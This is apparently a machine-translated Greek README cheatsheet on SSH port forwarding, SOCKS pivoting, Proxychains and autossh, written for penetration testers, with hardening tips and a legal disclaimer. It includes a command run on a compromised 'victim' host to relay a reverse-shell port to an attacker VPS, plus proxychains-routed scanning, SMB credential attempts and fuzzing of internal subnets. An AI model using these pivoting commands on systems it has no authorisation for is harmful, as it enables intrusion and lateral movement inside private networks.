<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 SSH Tunneling & Proxychains - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<p align="center">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="SSH Tunneling">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p align="center">
  <b>🚇 Ολοκληρωμένη αναφορά για σήραγγες SSH Local (-L), Remote/Reverse (-R) και Dynamic SOCKS (-D) με ενσωμάτωση Proxychains-ng</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Overview & Tunneling Architectures](#-επισκόπηση--tunneling-architectures)
- [Local Port Forwarding (`-L`)](#-local-port-forwarding--l)
  - [Syntax & Mechanics](#syntax--mechanics)
  - [Προώθηση εσωτερικής διεπαφής Ιστού](#forwarding-an-internal-web-interface)
  - [Προώθηση απομακρυσμένων θυρών βάσης δεδομένων](#forwarding-remote-database-ports)
- [Remote / Reverse Port Forwarding (`-R`)](#-mote--reverse-port-forwarding--r)
  - [Syntax & Mechanics](#syntax--mechanics-1)
  - [Exposing Local Reverse Shell Handler](#exposing-local-reverse-shell-handler)
  - [Μετάδοση εισερχόμενης κίνησης από το DMZ](#relaying-inbound-traffic-from-dmz)
- [Dynamic SOCKS Forwarding (`-D`)](#-dynamic-socks-forwarding--d)
  - [Syntax & SOCKS5 Setup](#syntax--socks5-setup)
- [Διαμόρφωση Proxychains-ng](#-proxychains-ng-configuration)
  - [Διαμόρφωση `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [Δρομολόγηση εργαλείων CLI μέσω αλυσίδων μεσολάβησης](#routing-cli-tools-through-proxychains)
- [Hosts Multi-Hop Pivoting & Jump Host (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
- [Μόνιμες σήραγγες με Autossh](#-persistent-tunnels-with-autossh)
- [Διαδραστικές ακολουθίες διαφυγής SSH (`~C`)](#-interactive-ssh-escape-sequences-c)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & Αρχιτεκτονικές Σήραγγας

Το SSH δεν είναι απλώς ένας πελάτης απομακρυσμένου τερματικού. είναι ένα κρυπτογραφημένο, αμφίδρομο επίπεδο μεταφοράς ροής byte που παρακάμπτει τις περιοριστικές πολιτικές τείχους προστασίας εξόδου/εισόδου:

1. **Τοπική προώθηση θυρών (`-L`):** Ανοίγει μια θύρα ακρόασης στον **τοπικό μηχάνημα του εισβολέα**. Οι συνδέσεις διοχετεύονται μέσω του SSH και προωθούνται σε έναν προορισμό προσβάσιμο από τον απομακρυσμένο διακομιστή SSH.
2. **Remote Port Forwarding (`-R`):** Ανοίγει μια θύρα ακρόασης στον **απομακρυσμένο διακομιστή SSH**. Οι εισερχόμενες συνδέσεις επιστρέφουν στο τοπικό μηχάνημα ή τον εσωτερικό στόχο του εισβολέα.
3. **Δυναμική προώθηση θυρών (`-D`):** Μετατρέπει το πρόγραμμα-πελάτη SSH σε τοπικό διακομιστή μεσολάβησης **SOCKS4/SOCKS5**, επιτρέποντας στα εργαλεία (Nmap, Burp Suite, Ffuf, Metasploit) να δρομολογούν αυθαίρετη κίνηση TCP στο απομακρυσμένο δίκτυο.
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 Τοπική προώθηση θυρών (`-L`)

### Σύνταξη & Μηχανική
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### Προώθηση εσωτερικής διεπαφής Ιστού
Αποκτήστε πρόσβαση σε έναν πίνακα διαχείρισης ιστού στο `172.16.0.15:80` μέσω του pivot `10.10.10.200`:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Τώρα περιηγηθείτε στο `http://127.0.0.1:8080` στο τοπικό σας πρόγραμμα περιήγησης.*

### Προώθηση απομακρυσμένων θυρών βάσης δεδομένων
Πρόσβαση σε μια εσωτερική βάση δεδομένων PostgreSQL που είναι συνδεδεμένη μόνο στο `127.0.0.1:5432` στον απομακρυσμένο διακομιστή:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!ΣΗΜΕΙΩΣΗ]
> Χρησιμοποιούνται σημαίες:
> - `-N`: Μην εκτελείτε εντολή απομακρυσμένου κελύφους (μόνο σήραγγα).
> - `-f`: Εκτέλεση στο παρασκήνιο αμέσως πριν από την εκτέλεση της εντολής.

---

## 🔄 Remote / Reverse Port Forwarding (`-R`)

### Σύνταξη & Μηχανική
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### Αποκάλυψη τοπικού χειριστή αντίστροφου κελύφους
Από ένα παραβιασμένο μηχάνημα στόχου πίσω από το NAT, τρυπήστε τα εξερχόμενα τείχη προστασίας για να στείλετε επισκεψιμότητα στον εξωτερικό ακροατή σας στο VPS:
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### Αναμετάδοση εισερχόμενης κυκλοφορίας από το DMZ
Προώθηση της θύρας 8080 στον απομακρυσμένο άξονα περιστροφής στην τοπική θύρα 80:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!ΣΗΜΑΝΤΙΚΟ]
> Για να συνδέσετε απομακρυσμένες θύρες σε όλες τις διεπαφές (`0.0.0.0`), το `/etc/ssh/sshd_config` του διακομιστή SSH πρέπει να ορίσει:
> `GatewayPorts yes` ή `GatewayPorts clientspecified`.

---

## 🌐 Dynamic SOCKS Forwarding (`-D`)

### Σύνταξη & SOCKS5 Setup
Δημιουργήστε έναν δυναμικό διακομιστή μεσολάβησης SOCKS5 στην τοπική θύρα `1080`:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
Βεβαιωθείτε ότι ο διακομιστής μεσολάβησης SOCKS ακούει:
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ Διαμόρφωση αλυσίδων μεσολάβησης

Οι αλυσίδες μεσολάβησης παρεμποδίζουν τις κλήσεις δικτύου δυναμικής βιβλιοθήκης (`connect()`, `gethostbyname()`) μέσω `LD_PRELOAD` για να εξαναγκάσουν τυπικές εφαρμογές CLI μέσω διαμεσολαβητών SOCKS/HTTP.

### Διαμόρφωση `/etc/proxychains4.conf`
Επεξεργαστείτε το αρχείο διαμόρφωσης για να οδηγεί στη σήραγγα SSH Dynamic SOCKS:
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### Δρομολόγηση εργαλείων CLI μέσω αλυσίδων μεσολάβησης
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 Πολλαπλοί Hop Pivoting & Jump Host (`-J`)

Όταν διασχίζετε πολλά τμηματοποιημένα όρια τείχους προστασίας:
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 Επίμονες σήραγγες με Autossh

Όταν πέφτουν οι σήραγγες SSH λόγω λήξης χρονικού ορίου δικτύου ή πέφτει το NAT, το `autossh` παρακολουθεί αυτόματα και επανεκκινεί τη σύνδεση SSH:
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ Διαδραστικές ακολουθίες διαφυγής SSH (`~C`)

Εάν έχετε ήδη ανοιχτή μια διαδραστική συνεδρία SSH και ξαφνικά πρέπει να ανοίξετε μια θύρα προς τα εμπρός χωρίς να αποσυνδεθείτε:

1. Πατήστε `Enter`
2. Πληκτρολογήστε `~C` (Tilde ακολουθούμενο από κεφαλαίο C)
3. Η προτροπή αλλάζει σε `ssh> `
4. Προσθέστε τους κανόνες προώθησης εν κινήσει:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
Ή δημιουργήστε δυναμικές ΚΑΛΤΣΕΣ:
   ```text
   ssh> -D 1080
   ```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Local Port Forward** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **Remote Port Forward** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **Δυναμική μεσολάβηση SOCKS5**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Σιωπηλή σήραγγα φόντου** | `ssh -f -N -D 1080 user@pivot` |
| **Jump Host Pivot** | `ssh -J user@hop1,user@hop2 target` |
| **Εργαλείο εκτέλεσης μέσω Proxychains** | `proxychains4 <TOOL> <ARGS>` |
| **Μόνιμη αυτόματη επανασύνδεση** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **Σήραγγα on-the-fly** | `Enter` μετά `~C` -> `ssh> -D 1080` |

---

## 🛡️ Αμυντικές Θεωρήσεις & OPSEC

1. **Απενεργοποίηση Port Forwarding σε SSHD:** Ρυθμίστε τα `AllowTcpForwarding no` και `PermitTunnel no` σε `/etc/ssh/sshd_config` σε σκληρυμένα συστήματα παραγωγής.
2. **Ανίχνευση ανωμαλίας ροής δικτύου:** Επίμονες μακροχρόνιες συνεδρίες SSH που μεταφέρουν σημαντικές αμφίδρομες ροές byte συχνά υποδεικνύουν διαδραστική σήραγγα ή διήθηση δεδομένων.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Η σήραγγα SSH και η περιστροφή δικτύου πρέπει να εκτελούνται μόνο σε δίκτυα και συστήματα για τα οποία έχει ληφθεί ρητή γραπτή εξουσιοδότηση. Η μη εξουσιοδοτημένη παράκαμψη των τείχη προστασίας περιμετρικού δικτύου είναι παράνομη.